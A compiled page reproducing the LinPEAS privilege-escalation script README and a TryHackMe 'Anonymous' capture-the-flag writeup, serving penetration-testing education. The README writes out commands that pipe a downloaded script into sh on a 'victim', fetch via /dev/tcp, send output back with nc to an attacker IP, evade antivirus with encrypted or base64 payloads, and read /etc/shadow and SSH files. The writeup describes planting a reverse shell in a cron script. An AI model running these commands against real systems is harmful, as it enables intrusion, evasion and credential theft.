# LinPEAS - Linux Privilege Escalation Awesome Script

[](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS#linpeas---linux-privilege-escalation-awesome-script)

[![](https://github.com/peass-ng/PEASS-ng/raw/master/linPEAS/images/linpeas.png)](https://github.com/peass-ng/PEASS-ng/raw/master/linPEAS/images/linpeas.png)

**LinPEAS is a script that search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts. The checks are explained on [book.hacktricks.xyz](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)**

Check the **Local Linux Privilege Escalation checklist** from **[book.hacktricks.xyz](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist)**.

[![asciicast](https://camo.githubusercontent.com/6027e47793d4c2b5483498e6e48fa64346becd6301151f58a7ec6759f5a8b5f1/68747470733a2f2f61736369696e656d612e6f72672f612f3235303533322e706e67)](https://asciinema.org/a/309566)

## MacPEAS

[](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS#macpeas)

Just execute `linpeas.sh` in a MacOS system and the **MacPEAS version will be automatically executed**

## Quick Start

[](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS#quick-start)

Find the **latest versions of all the scripts and binaries in [the releases page](https://github.com/peass-ng/PEASS-ng/releases/latest)**.

```shell
# From github
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Without curl
python -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"

python3 -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
```

```shell
# Local network
sudo python3 -m http.server 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
```

```shell
# Output to file
./linpeas.sh -a > /dev/shm/linpeas.txt #Victim
less -r /dev/shm/linpeas.txt #Read with colors
```

```shell
# Use a linpeas binary
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
chmod +x linpeas_linux_amd64
./linpeas_linux_amd64
```

## Firmware Analysis

[](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS#firmware-analysis)

If you have a **firmware** and you want to **analyze it with linpeas** to **search for passwords or bad configured permissions** you have 2 main options.

- If you **can emulate** the firmware, just run linpeas inside of it:

```shell
cp /path/to/linpeas.sh /mnt/linpeas.sh
chroot /mnt #Supposing you have mounted the firmware FS in /mnt
bash /linpeas.sh -o software_information,interesting_files,api_keys_regex
```

- If you **cannot emulate** the firmware, use the `-f </path/to/folder` param:

```shell
# Point to the folder containing the files you want to analyze
bash /path/to/linpeas.sh -f /path/to/folder
```

## AV bypass

[](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS#av-bypass)

```shell
#open-ssl encryption
openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc
sudo python -m SimpleHTTPServer 80 #Start HTTP server
curl 10.10.10.10/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh #Download from the victim

#Base64 encoded
base64 -w0 linpeas.sh > lp.enc
sudo python -m SimpleHTTPServer 80 #Start HTTP server
curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim
```

## Basic Information

[](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS#basic-information)

The goal of this script is to search for possible **Privilege Escalation Paths** (tested in Debian, CentOS, FreeBSD, OpenBSD and MacOS).

This script doesn't have any dependency.

It uses **/bin/sh** syntax, so can run in anything supporting `sh` (and the binaries and parameters used).

By default, **linpeas won't write anything to disk and won't try to login as any other user using `su`**.

By default linpeas takes around **4 mins** to complete, but It could take from **5 to 10 minutes** to execute all the checks using **-a** parameter _(Recommended option for CTFs)_:

- From less than 1 min to 2 mins to make almost all the checks
- Almost 1 min to search for possible passwords inside all the accesible files of the system
- 20s/user bruteforce with top2000 passwords _(need `-a`)_ - Notice that this check is **super noisy**
- 1 min to monitor the processes in order to find very frequent cron jobs _(need `-a`)_ - Notice that this check will need to **write** some info inside a file that will be deleted

**Interesting parameters:**

- **-a** (all checks except regex) - This will **execute also the check of processes during 1 min, will search more possible hashes inside files, and brute-force each user using `su` with the top2000 passwords.**
- **-e** (extra enumeration) - This will execute **enumeration checkes that are avoided by default**
- **-r** (regex checks) - This will search for **hundreds of API keys of different platforms in the Filesystem**
- **-s** (superfast & stealth) - This will bypass some time consuming checks - **Stealth mode** (Nothing will be written to disk)
- **-P** (Password) - Pass a password that will be used with `sudo -l` and bruteforcing other users
- **-D** (Debug) - Print information about the checks that haven't discovered anything and about the time each check took
- **-d/-p/-i/-t** (Local Network Enumeration) - Linpeas can also discover and port-scan local networks

**It's recommended to use the params `-a` and `-r` if you are looking for a complete and intensive scan**.

```
Enumerate and search Privilege Escalation vectors.
This tool enum and search possible misconfigurations (known vulns, user, processes and file permissions, special file permissions, readable/writable files, bruteforce other users(top1000pwds), passwords...) inside the host and highlight possible misconfigurations with colors.
        Checks:
            -o Only execute selected checks (system_information,container,cloud,procs_crons_timers_srvcs_sockets,network_information,users_information,software_information,interesting_files,api_keys_regex). Select a comma separated list.
            -s Stealth & faster (don't check some time consuming checks)
            -e Perform extra enumeration
            -t Automatic network scan & Internet conectivity checks - This option writes to files
            -r Enable Regexes (this can take from some mins to hours)
            -P Indicate a password that will be used to run 'sudo -l' and to bruteforce other users accounts via 'su'
	      -D Debug mode

        Network recon:
            -t Automatic network scan & Internet conectivity checks - This option writes to files
	      -d <IP/NETMASK> Discover hosts using fping or ping. Ex: -d 192.168.0.1/24
            -p <PORT(s)> -d <IP/NETMASK> Discover hosts looking for TCP open ports (via nc). By default ports 22,80,443,445,3389 and another one indicated by you will be scanned (select 22 if you don't want to add more). You can also add a list of ports. Ex: -d 192.168.0.1/24 -p 53,139
            -i <IP> [-p <PORT(s)>] Scan an IP using nc. By default (no -p), top1000 of nmap will be scanned, but you can select a list of ports instead. Ex: -i 127.0.0.1 -p 53,80,443,8000,8080
             Notice that if you specify some network scan (options -d/-p/-i but NOT -t), no PE check will be performed

        Port forwarding:
            -F LOCAL_IP:LOCAL_PORT:REMOTE_IP:REMOTE_PORT Execute linpeas to forward a port from a local IP to a remote IP

        Firmware recon:
            -f </FOLDER/PATH> Execute linpeas to search passwords/file permissions misconfigs inside a folder

        Misc:
            -h To show this message
	      -w Wait execution between big blocks of checks
            -L Force linpeas execution
            -M Force macpeas execution
	      -q Do not show banner
            -N Do not use colours

```

## Hosts Discovery and Port Scanning

[](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS#hosts-discovery-and-port-scanning)

With LinPEAS you can also **discover hosts automatically** using `fping`, `ping` and/or `nc`, and **scan ports** using `nc`.

LinPEAS will **automatically search for this binaries** in `$PATH` and let you know if any of them is available. In that case you can use LinPEAS to hosts dicovery and/or port scanning.

[![](https://github.com/peass-ng/PEASS-ng/raw/master/linPEAS/images/network.png)](https://github.com/peass-ng/PEASS-ng/raw/master/linPEAS/images/network.png)

## Colors

[](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS#colors)

Details

[![](https://camo.githubusercontent.com/4249742eacd246d84cb7544c93c7edc3d6a4ae311ee174deeb1e73f378598bb7/68747470733a2f2f706c616365686f6c642e69742f31352f6233323430302f3030303030303f746578743d2b)](https://camo.githubusercontent.com/4249742eacd246d84cb7544c93c7edc3d6a4ae311ee174deeb1e73f378598bb7/68747470733a2f2f706c616365686f6c642e69742f31352f6233323430302f3030303030303f746578743d2b)[![](https://camo.githubusercontent.com/336ff2993844d15c273483b9d1a99439868fa63fe8e00144a2c357fb5f6eaec1/68747470733a2f2f706c616365686f6c642e69742f31352f6666663530302f3030303030303f746578743d2b)](https://camo.githubusercontent.com/336ff2993844d15c273483b9d1a99439868fa63fe8e00144a2c357fb5f6eaec1/68747470733a2f2f706c616365686f6c642e69742f31352f6666663530302f3030303030303f746578743d2b)

[![](https://camo.githubusercontent.com/4249742eacd246d84cb7544c93c7edc3d6a4ae311ee174deeb1e73f378598bb7/68747470733a2f2f706c616365686f6c642e69742f31352f6233323430302f3030303030303f746578743d2b)](https://camo.githubusercontent.com/4249742eacd246d84cb7544c93c7edc3d6a4ae311ee174deeb1e73f378598bb7/68747470733a2f2f706c616365686f6c642e69742f31352f6233323430302f3030303030303f746578743d2b)

- [](https://gtfobins.github.io/)

[![](https://camo.githubusercontent.com/7a5086e3f5549fdb9cd8aab5041c6f1578b9112433e29be127e5ccc139410b7b/68747470733a2f2f706c616365686f6c642e69742f31352f3636666633332f3030303030303f746578743d2b)](https://camo.githubusercontent.com/7a5086e3f5549fdb9cd8aab5041c6f1578b9112433e29be127e5ccc139410b7b/68747470733a2f2f706c616365686f6c642e69742f31352f3636666633332f3030303030303f746578743d2b)

[![](https://camo.githubusercontent.com/dbbae316fdec9b21bbd6ef3400cf8d9f7fd0ecbdabc7d34c66ac9a186594ebe0/68747470733a2f2f706c616365686f6c642e69742f31352f3030363666662f3030303030303f746578743d2b)](https://camo.githubusercontent.com/dbbae316fdec9b21bbd6ef3400cf8d9f7fd0ecbdabc7d34c66ac9a186594ebe0/68747470733a2f2f706c616365686f6c642e69742f31352f3030363666662f3030303030303f746578743d2b)

[![](https://camo.githubusercontent.com/2d98918a02d38097f0c912fe484b8030255c7caa879b5639a63e8a13f5a31a14/68747470733a2f2f706c616365686f6c642e69742f31352f3333636366662f3030303030303f746578743d2b)](https://camo.githubusercontent.com/2d98918a02d38097f0c912fe484b8030255c7caa879b5639a63e8a13f5a31a14/68747470733a2f2f706c616365686f6c642e69742f31352f3333636366662f3030303030303f746578743d2b)

[![](https://camo.githubusercontent.com/2133c1aa7d0e089ecb5a5fd76204e47b91cd69e58008ca0ed8f7bc4021a02fdc/68747470733a2f2f706c616365686f6c642e69742f31352f6266383066662f3030303030303f746578743d2b)](https://camo.githubusercontent.com/2133c1aa7d0e089ecb5a5fd76204e47b91cd69e58008ca0ed8f7bc4021a02fdc/68747470733a2f2f706c616365686f6c642e69742f31352f6266383066662f3030303030303f746578743d2b)

## One-liner Enumerator

[](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS#one-liner-enumerator)

Here you have an old linpe version script in one line, **just copy and paste it**;)

**The color filtering is not available in the one-liner** (the lists are too big)

This one-liner is deprecated (I'm not going to update it any more), but it could be useful in some cases so it will remain here.

The default file where all the data is stored is: _/tmp/linPE_ (you can change it at the beginning of the script)

```shell
file="/tmp/linPE";RED='\033[0;31m';Y='\033[0;33m';B='\033[0;34m';NC='\033[0m';rm -rf $file;echo "File: $file";echo "[+]Gathering system information...";printf $B"[*] "$RED"BASIC SYSTEM INFO\n"$NC >> $file ;echo "" >> $file;printf $Y"[+] "$RED"Operative system\n"$NC >> $file;(cat /proc/version || uname -a ) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"PATH\n"$NC >> $file;echo $PATH 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Date\n"$NC >> $file;date 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Sudo version\n"$NC >> $file;sudo -V 2>/dev/null| grep "Sudo ver" >> $file;echo "" >> $file;printf $Y"[+] "$RED"selinux enabled?\n"$NC >> $file;sestatus 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Useful software?\n"$NC >> $file;which nc ncat netcat wget curl ping gcc make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Capabilities\n"$NC >> $file;getcap -r / 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Environment\n"$NC >> $file;(set || env) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Top and cleaned proccesses\n"$NC >> $file;ps aux 2>/dev/null | grep -v "\[" >> $file;echo "" >> $file;printf $Y"[+] "$RED"Binary processes permissions\n"$NC >> $file;ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Services\n"$NC >> $file;(/usr/sbin/service --status-all || /sbin/chkconfig --list || /bin/rc-status) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Different processes executed during 1 min (HTB)\n"$NC >> $file;if [ "`ps -e --format cmd`" ]; then for i in {1..121}; do ps -e --format cmd >> $file.tmp1; sleep 0.5; done; sort $file.tmp1 | uniq | grep -v "\[" | sed '/^.\{500\}./d' >> $file; rm $file.tmp1; fi;echo "" >> $file;printf $Y"[+] "$RED"Proccesses binary permissions\n"$NC >> $file;ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Scheduled tasks\n"$NC >> $file;crontab -l 2>/dev/null >> $file;ls -al /etc/cron* 2>/dev/null >> $file;cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root /var/spool/anacron 2>/dev/null | grep -v "^#" >> $file;echo "" >> $file;printf $Y"[+] "$RED"Any sd* disk in /dev?\n"$NC >> $file;ls /dev 2>/dev/null | grep -i "sd" >> $file;echo "" >> $file;printf $Y"[+] "$RED"Storage information\n"$NC >> $file;df -h 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Unmounted file-system?\n"$NC >> $file;cat /etc/fstab 2>/dev/null | grep -v "^#" >> $file;echo "" >> $file;printf $Y"[+] "$RED"Printer?\n"$NC >> $file;lpstat -a 2>/dev/null >> $file;echo "" >> $file;echo "" >> $file;echo "[+]Gathering network information...";printf $B"[*] "$RED"NETWORK INFO\n"$NC >> $file ;echo "" >> $file;printf $Y"[+] "$RED"Hostname, hosts and DNS\n"$NC >> $file;cat /etc/hostname /etc/hosts /etc/resolv.conf 2>/dev/null | grep -v "^#" >> $file;dnsdomainname 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Networks and neightbours\n"$NC >> $file;cat /etc/networks 2>/dev/null >> $file;(ifconfig || ip a) 2>/dev/null >> $file;iptables -L 2>/dev/null >> $file;ip n 2>/dev/null >> $file;route -n 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Ports\n"$NC >> $file;(netstat -punta || ss -t; ss -u) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Can I sniff with tcpdump?\n"$NC >> $file;timeout 1 tcpdump >> $file 2>&1;echo "" >> $file;echo "" >> $file;echo "[+]Gathering users information...";printf $B"[*] "$RED"USERS INFO\n"$NC >> $file ;echo "" >> $file;printf $Y"[+] "$RED"Me\n"$NC >> $file;(id || (whoami && groups)) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Sudo -l without password\n"$NC >> $file;echo '' | sudo -S -l -k 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Do I have PGP keys?\n"$NC >> $file;gpg --list-keys 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Superusers\n"$NC >> $file;awk -F: '($3 == "0") {print}' /etc/passwd 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Login\n"$NC >> $file;w 2>/dev/null >> $file;last 2>/dev/null | tail >> $file;echo "" >> $file;printf $Y"[+] "$RED"Users with console\n"$NC >> $file;cat /etc/passwd 2>/dev/null | grep "sh$" >> $file;echo "" >> $file;printf $Y"[+] "$RED"All users\n"$NC >> $file;cat /etc/passwd 2>/dev/null | cut -d: -f1 >> $file;echo "" >> $file;echo "" >> $file;echo "[+]Gathering files information...";printf $B"[*] "$RED"INTERESTING FILES\n"$NC >> $file ;echo "" >> $file;printf $Y"[+] "$RED"SUID\n"$NC >> $file;find / -perm -4000 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"SGID\n"$NC >> $file;find / -perm -g=s -type f 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Files inside \$HOME (limit 20)\n"$NC >> $file;ls -la $HOME 2>/dev/null | head -n 20 >> $file;echo "" >> $file;printf $Y"[+] "$RED"20 First files of /home\n"$NC >> $file;find /home -type f 2>/dev/null | column -t | grep -v -i "/"$USER | head -n 20 >> $file;echo "" >> $file;printf $Y"[+] "$RED"Files inside .ssh directory?\n"$NC >> $file;find  /home /root -name .ssh 2>/dev/null -exec ls -laR {} \; >> $file;echo "" >> $file;printf $Y"[+] "$RED"*sa_key* files\n"$NC >> $file;find / -type f -name "*sa_key*" -ls 2>/dev/null -exec ls -l {} \; >> $file;echo "" >> $file;printf $Y"[+] "$RED"Mails?\n"$NC >> $file;ls -alh /var/mail/ /var/spool/mail/ 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"NFS exports?\n"$NC >> $file;cat /etc/exports 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Hashes inside /etc/passwd? Readable /etc/shadow or /etc/master.passwd?\n"$NC >> $file;grep -v '^[^:]*:[x]' /etc/passwd 2>/dev/null >> $file;cat /etc/shadow /etc/master.passwd 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Readable /root?\n"$NC >> $file;ls -ahl /root/ 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Inside docker or lxc?\n"$NC >> $file;dockercontainer=`grep -i docker /proc/self/cgroup  2>/dev/null; find / -name "*dockerenv*" -exec ls -la {} \; 2>/dev/null`;lxccontainer=`grep -qa container=lxc /proc/1/environ 2>/dev/null`;if [ "$dockercontainer" ]; then echo "Looks like we're in a Docker container" >> $file; fi;if [ "$lxccontainer" ]; then echo "Looks like we're in a LXC container" >> $file; fi;echo "" >> $file;printf $Y"[+] "$RED"*_history, profile, bashrc, httpd.conf\n"$NC >> $file;find / -type f \( -name "*_history" -o -name "profile" -o -name "*bashrc" -o -name "httpd.conf" \) -exec ls -l {} \; 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"All hidden files (not in /sys/) (limit 100)\n"$NC >> $file;find / -type f -iname ".*" -ls 2>/dev/null | grep -v "/sys/" | head -n 100 >> $file;echo "" >> $file;printf $Y"[+] "$RED"What inside /tmp, /var/tmp, /var/backups\n"$NC >> $file;ls -a /tmp /var/tmp /var/backups 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Interesting writable Files\n"$NC >> $file;USER=`whoami`;HOME=/home/$USER;find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | grep -v '/sys/fs'| sort | uniq >> $file;for g in `groups`; do find / \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME | grep -v '/sys/fs'; done >> $file;echo "" >> $file;printf $Y"[+] "$RED"Web files?(output limited)\n"$NC >> $file;ls -alhR /var/www/ 2>/dev/null | head >> $file;ls -alhR /srv/www/htdocs/ 2>/dev/null | head >> $file;ls -alhR /usr/local/www/apache22/data/ 2>/dev/null | head >> $file;ls -alhR /opt/lampp/htdocs/ 2>/dev/null | head >> $file;echo "" >> $file;printf $Y"[+] "$RED"Backup files?\n"$NC >> $file;find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*back*" -o -name "*bck*" \) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Find IPs inside logs\n"$NC >> $file;grep -a -R -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' /var/log/ 2>/dev/null | sort | uniq >> $file;echo "" >> $file;printf $Y"[+] "$RED"Find 'password' or 'passw' string inside /home, /var/www, /var/log, /etc\n"$NC >> $file;grep -lRi "password\|passw" /home /var/www /var/log 2>/dev/null | sort | uniq >> $file;echo "" >> $file;printf $Y"[+] "$RED"Sudo -l (you need to puts the password and the result appear in console)\n"$NC >> $file;sudo -l;
```

## PEASS Style

[](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS#peass-style)

Are you a PEASS fan? Get now our merch at **[PEASS Shop](https://teespring.com/stores/peass)** and show your love for our favorite peas

## Collaborate

[](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS#collaborate)

If you want to help with the TODO tasks or with anything, you can do it using **[github issues](https://github.com/peass-ng/PEASS-ng/issues) or you can submit a pull request**.

If you find any issue, please report it using **[github issues](https://github.com/peass-ng/PEASS-ng/issues)**.

**Linpeas** is being **updated** every time I find something that could be useful to escalate privileges.

## Advisory

[](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS#advisory)

All the scripts/binaries of the PEAS Suite should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.

By Polop(TM)

**Credit:** This information was adapted from an excellent guide on [GitHub](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS). Be sure to check out the original post for more details.

# Anonymous: TryHackMe Box Writeup


![TryHackMe Anonymous Writeup](https://miro.medium.com/v2/resize:fit:512/1*a9ZzT3CS01-UvLWufV268Q.png)

# About the Box:

Gaining access to the machine using the available information while enumerating and make use of evn to gain root access. Link: [https://tryhackme.com/room/anonymous](https://tryhackme.com/room/anonymous)

# Tools used in this box:

nmap, wget, [LinPEAS.sh](http://linpeas.sh/)

# Scanning the box:

Nmap port scan

The scan result shows 4 ports are open which helps us to narrow down the scan. I have used -T5 and — min-rate=2500 switch to speed up the process.

![Nmap Port scan](https://miro.medium.com/v2/resize:fit:620/0*YsF39Xj97idlQviZ)

After a full scan on all the four ports shows us that we can make use of the Anonymous login for FTP and SMB.

This time I have used -A switch which is equivalent to -sC -sV and -O

![](https://miro.medium.com/v2/resize:fit:700/0*jawZY5X2BrB_nKAT)

# Enumerating the box:

First, let us go ahead with the FTP login.

![FTP Login](https://miro.medium.com/v2/resize:fit:629/0*kTQDtmVnH1RC5LJY)

You can login using the anonymous:anonymous credential. When we perform ‘ls’ command it shows a read, write and execute permission for the “scripts” folder.

We also have a read, write, and execute permission for the clean.sh file, so let us download all the three files under the script folder to have a look at them.

While downloading the files I encourage you to use “binary” command if the files are said to be an executable or any sort of binary as this would prevent errors while executing the program.

“mget” command helps you to download multiple files at the same time.

Let us have a view of the first file which is “to_do.txt”

![FTP to do text file view](https://miro.medium.com/v2/resize:fit:558/0*EkBNLrekZPL2pJQC)

It is a self note to the user to disable anonymous login for FTP and SMB which he has forgotten to disable it. And yeah it is really not safe ;-)

The next is “removed_files.log” file so let us proceed with the cat view.

![FTP log file view](https://miro.medium.com/v2/resize:fit:524/0*0gJkeUgOGjNJn5AD)

The log shows us some positive evidence that a cron job is been executed on the machine and if you are wondering which script it has been executing, yes it's clean.sh script file. So let us have a look at it.

![FTP clean script view](https://miro.medium.com/v2/resize:fit:700/0*FO3BCQsyQnC1Q8mN)

The script does nothing but cleans the temp folder like how a windows user would clean the junk files. Since no file is available in /tmp folder it shows “nothing to delete” as a result in the “removed_files.log” file.

# Gaining foothold:

Now if you have paid enough attention to the file permission to each file residing in the script folder, the clean.sh has a read, write, and execute permission to all the users. So you can add content to the “clean.sh” script which gets executed by the cron job.

So let us edit the “clean.sh” file that we have downloaded previously, with a reverse shell command, and then upload it. After the edit, your final script should look-alike this.

![Updating clean.sh script file](https://miro.medium.com/v2/resize:fit:538/0*oc_hYyhW13kIJNe9)

I have just created a reverse shell to port “5555”. Next, you have to set a listener on port “5555” with the help of the netcat tool.

![SimpleHTTPServer setup](https://miro.medium.com/v2/resize:fit:536/0*rfz05GO6ITf_Zdo2)

Now its time to upload the modified file.

![FTP PUT upload](https://miro.medium.com/v2/resize:fit:605/0*_dHtJuPoRU5VI1OX)

Make sure you enable the binary mode before you transfer the file.

If everything has gone well then you should be having a shell by now :-)

![Netcat Linsenter](https://miro.medium.com/v2/resize:fit:638/0*N2C63j1OYc9enDrx)

By this time if you are wondering why the SMB anonymous was enabled, well it was a rabbit hole :-D Nothing much done there, all you get is some cute dog images. It could have been a choice of interest if this was a steganography kind of box. But this one is NOT.

You can cat the “user.txt” for the user flag.

# Privilege Escalation:

Now its time for escalation. This part is pretty simple, you can use LinPEAS ([https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)) which makes our job much simpler but I would also, encourage you to do some manual checks in case if you land on a box which does not allow any alien files.

A good writeup on linuxpriv ([https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html))

Let us start with the “LinPEAS.sh” after the download you can start SimpleHTTPServer with the help of python module.

![](https://miro.medium.com/v2/resize:fit:700/0*QD5A_Zb25CBqPmZQ)

Now you can download the file on the victim machine with the help of “wget”

![Wget download](https://miro.medium.com/v2/resize:fit:636/0*hGqfKlfOwMxkEocg)

Once the download is completed make sure you set the “execute” permission to the file.

Now that everything is set, you can proceed to execute the script using “./linpeash.sh”. Once the script has completed its job, scrolling through the pages you would see something that LinPEAS has highlighted for us

![](https://miro.medium.com/v2/resize:fit:126/0*WqJZLaG7_AHKUoLU)

And this is found under “Interesting Files” division.

![linpeas view](https://miro.medium.com/v2/resize:fit:700/0*nMyCbmHYbxQGDNL9)

If you wish to choose the manual method then the command to list the same would be: “find / -perm -u=s -type f 2>/dev/null” The “find / -perm -u=s -type f”. This command would search for files that have SUID (Set owner User ID upon execution) files, starting from “/” directory and the “2>/dev/null” command would ignore the error messages.

Hence the final result should be like this.

![](https://miro.medium.com/v2/resize:fit:172/0*dKi5Vb6R8hg-2HtI)

Now if you google on how to exploit “env” you would land on the GTFOBins page ([https://gtfobins.github.io/gtfobins/env/](https://gtfobins.github.io/gtfobins/env/))

![gtfobins env view](https://miro.medium.com/v2/resize:fit:700/0*qUBhPRdCT6VuP7Lj)

Now all you have to do is type the above command to elevate the session. Please check your shell path before executing the command.

![](https://miro.medium.com/v2/resize:fit:414/0*Rh1UWPKdvmKN-ypV)

# Conclusion:

This box helps you to sharpen the manual methods to escalate the privileges in Linux.

**Credit:** This information was adapted from an excellent guide on [Medium](https://medium.com/@malcolmsimson/anonymous-tryhackme-box-writeup-3390b559a2ac). Be sure to check out the original post for more details.

<iframe width="560" height="315" src="https://www.youtube.com/embed/OPWYKR7M_Uo?si=OXX6smKJqb0jUSHW" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

**Credit:** This information was adapted from an excellent guide on [YouTube](https://www.youtube.com/watch?v=OPWYKR7M_Uo). Be sure to check out the original post for more details.

<iframe width="560" height="315" src="https://www.youtube.com/embed/ktL-ijmx8z0?si=miIX7n1fcGVBf16V" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

**Credit:** This information was adapted from an excellent guide on [YouTube](https://www.youtube.com/watch?v=ktL-ijmx8z0). Be sure to check out the original post for more details.

<iframe width="560" height="315" src="https://www.youtube.com/embed/9xtIfiQ63Hk?si=lUdJ4hjkVfUYhO3_" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

**Credit:** This information was adapted from an excellent guide on [YouTube](https://www.youtube.com/watch?v=9xtIfiQ63Hk). Be sure to check out the original post for more details.

